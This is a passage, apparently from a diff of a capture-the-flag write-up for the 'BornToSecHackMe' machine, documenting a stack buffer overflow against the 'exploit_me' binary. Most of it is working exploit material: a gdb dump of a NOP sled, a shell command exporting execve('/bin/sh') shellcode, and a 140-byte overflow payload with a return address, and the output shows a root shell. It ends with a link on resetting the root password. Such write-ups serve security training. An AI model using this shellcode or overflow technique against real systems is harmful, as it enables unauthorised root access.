+0xbffff83f:      "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
+(gdb) x/100xg 0xbffff83f
+0xbffff83f:     0x444f434c4c454853      0x9090909090903d45
+0xbffff84f:     0x9090909090909090      0x9090909090909090
+0xbffff85f:     0x9090909090909090      0x9090909090909090
+0xbffff86f:     0x9090909090909090      0x9090909090909090
+0xbffff87f:     0x9090909090909090      0x9090909090909090
+0xbffff88f:     0x9090909090909090      0x9090909090909090
+0xbffff89f:     0x9090909090909090      0x9090909090909090
+0xbffff8af:     0x9090909090909090      0x9090909090909090
+0xbffff8bf:     0x9090909090909090      0x9090909090909090
+0xbffff8cf:     0x9090909090909090      0x9090909090909090
+0xbffff8df:     0x9090909090909090      0x9090909090909090
+0xbffff8ef:     0x9090909090909090      0x9090909090909090
+0xbffff8ff:     0x9090909090909090      0x9090909090909090
+0xbffff90f:     0x2f2f6850c0319090      0x896e69622f686873
+0xbffff91f:     0xcd0bb0e1895350e3      0x3d4c4c4548530080
+[...]
+zaz@BornToSecHackMe:~$ ./exploit_me `python -c 'print "i"*140 + "\xbf\xf8\xff\xbf"'`
+iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii    
+# whoami
+root
+
+
+zaz@BornToSecHackMe:~$ export SHELLCODE=`python -c 'print "\x90" * 200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'`
+zaz@BornToSecHackMe:~$ ./exploit_me `python -c 'print "i"*140 + "\xbf\xf8\xff\xbf"'`
+iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii    
+# whoami
+root
+#
+
+___________________
+
+bonus: reset root password
+https://askubuntu.com/questions/24006/how-do-i-reset-a-lost-administrative-password
+
